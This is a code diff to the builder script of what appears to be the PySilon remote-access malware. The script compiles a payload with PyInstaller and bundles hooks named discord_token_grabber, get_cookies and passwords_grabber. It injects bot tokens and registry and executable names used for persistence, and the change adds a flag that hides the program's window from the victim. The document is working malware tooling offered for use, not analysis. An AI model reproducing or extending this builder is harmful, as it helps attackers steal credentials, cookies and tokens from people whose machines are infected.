@@ -63,7 +63,7 @@ else:
 if input('Would you like to set a custom icon to compiled executable? Y/n ').lower() == 'y':
     icon_path = get_file_path()
 
-pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& pyinstaller -F --add-data "resources/libopus-0.x64.dll;." --runtime-hook=resources/misc.py --runtime-hook=resources/discord_token_grabber.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py ' + (('--icon "' + icon_path + '" ') if icon_path != '' else '') + '"main_prepared.py" & echo - & echo.Done & echo.- & pause & exit"'
+pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& pyinstaller -F -w --add-data "resources/libopus-0.x64.dll;." --runtime-hook=resources/misc.py --runtime-hook=resources/discord_token_grabber.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py ' + (('--icon "' + icon_path + '" ') if icon_path != '' else '') + '"main_prepared.py" & echo - & echo.Done & echo.- & pause & exit"'
 # Uncomment if you want to use pre-downloaded PyInstaller #pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& pyinstaller -F --runtime-hook=resources/misc.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py ' + (('--icon "' + icon_path + '" ') if icon_path != '' else '') + '"main_prepared.py" & echo - & echo.Done & echo.- & pause & exit"'
 
 with open('PySilon.key', 'wb') as save_key: save_key.write(os.urandom(1024*1024))
@@ -72,32 +72,33 @@ with open('main_prepared.py', 'w', encoding='utf-8') as edit_source_code:
     for line in range(len(source_code)):
         if mode == 1:
             match line:
-                case 46: edit_source_code.write('bot_tokens = [\'' + settings[6] + '\']\n')
-                case 47: edit_source_code.write('software_registry_name = \'' + settings[7] + '\'\n')
-                case 48: edit_source_code.write('software_directory_name = \'' + (settings[8] if settings[8] != '' else settings[7]) + '\'\n')
-                case 49: edit_source_code.write('software_executable_name = \'' + (settings[9] if settings[9] != '' else (settings[8] if settings[8] != '' else settings[7]) + '.exe') + '\'\n')
-                case 52: edit_source_code.write('    \'info\': ' + settings[0] + ',\n')
-                case 53: edit_source_code.write('    \'main\': ' + settings[1] + ',\n')
-                case 54: edit_source_code.write('    \'spam\': ' + settings[2] + ',\n')
-                case 55: edit_source_code.write('    \'file\': ' + settings[3] + ',\n')
-                case 56: edit_source_code.write('    \'recordings\': ' + settings[4] + ',\n')
-                case 57: edit_source_code.write('    \'voice\': ' + settings[5] + '\n')
-                case 60: edit_source_code.write('secret_key = \'' + get_file_hash('PySilon.key') + '\'   # Don\'t touch this line (just leave)\n')
+                case 79: edit_source_code.write('bot_tokens = [\'' + settings[6] + '\']\n')
+                case 80: edit_source_code.write('software_registry_name = \'' + settings[7] + '\'\n')
+                case 81: edit_source_code.write('software_directory_name = \'' + (settings[8] if settings[8] != '' else settings[7]) + '\'\n')
+                case 82: edit_source_code.write('software_executable_name = \'' + (settings[9] if settings[9] != '' else (settings[8] if settings[8] != '' else settings[7]) + '.exe') + '\'\n')
+                case 85: edit_source_code.write('    \'info\': ' + settings[0] + ',\n')
+                case 86: edit_source_code.write('    \'main\': ' + settings[1] + ',\n')
+                case 87: edit_source_code.write('    \'spam\': ' + settings[2] + ',\n')
+                case 88: edit_source_code.write('    \'file\': ' + settings[3] + ',\n')
+                case 89: edit_source_code.write('    \'recordings\': ' + settings[4] + ',\n')
+                case 90: edit_source_code.write('    \'voice\': ' + settings[5] + '\n')
+                case 93: edit_source_code.write('secret_key = \'' + get_file_hash('PySilon.key') + '\'   # Don\'t touch this line (just leave)\n')
                 case _: edit_source_code.write(source_code[line])
         else:
             match line:
-                case 46: edit_source_code.write('bot_tokens = [\'' + ('\', \''.join(tokens) if tokens[-1] != '' else '\', \''.join(tokens[:-1])) + '\']\n')
-                case 47: edit_source_code.write('software_registry_name = \'' + settings[0] + '\'\n')
-                case 48: edit_source_code.write('software_directory_name = \'' + (settings[1] if settings[1] != '' else settings[0]) + '\'\n')
-                case 49: edit_source_code.write('software_executable_name = \'' + (settings[2] if settings[2] != '' else ((settings[1] if settings[1] != '' else settings[0]) + '.exe')) + '\'\n')
-                case 52: edit_source_code.write('    \'info\': None,\n')
-                case 53: edit_source_code.write('    \'main\': None,\n')
-                case 54: edit_source_code.write('    \'spam\': None,\n')
-                case 55: edit_source_code.write('    \'file\': None,\n')
-                case 56: edit_source_code.write('    \'recordings\': None,\n')
-                case 57: edit_source_code.write('    \'voice\': None\n')
-                case 60: edit_source_code.write('secret_key = \'' + get_file_hash('PySilon.key') + '\'   # Don\'t touch this line (just leave)\n')
-                case 61: edit_source_code.write('guild_id = ' + guild_id + '\n')
+                case 79: edit_source_code.write('bot_tokens = [\'' + ('\', \''.join(tokens) if tokens[-1] != '' else '\', \''.join(tokens[:-1])) + '\']\n')
+                case 80: edit_source_code.write('software_registry_name = \'' + settings[0] + '\'\n')
+                case 81: edit_source_code.write('software_directory_name = \'' + (settings[1] if settings[1] != '' else settings[0]) + '\'\n')
+                case 82: edit_source_code.write('software_executable_name = \'' + (settings[2] if settings[2] != '' else ((settings[1] if settings[1] != '' else settings[0]) + '.exe')) + '\'\n')
+                case 85: edit_source_code.write('    \'info\': None,\n')
+                case 86: edit_source_code.write('    \'main\': None,\n')
+                case 87: edit_source_code.write('    \'spam\': None,\n')
+                case 88: edit_source_code.write('    \'file\': None,\n')
+                case 89: edit_source_code.write('    \'recordings\': None,\n')
+                case 90: edit_source_code.write('    \'voice\': None\n')
+                case 93: edit_source_code.write('secret_key = \'' + get_file_hash('PySilon.key') + '\'   # Don\'t touch this line (just leave)\n')
+                case 94: edit_source_code.write('guild_id = ' + guild_id + '\n')
+                case 104: edit_source_code.write('#opuslib_path = \'resources/libopus-0.x64.dll\'')
                 case _: edit_source_code.write(source_code[line])
 
 os.system(pyinstaller_command)
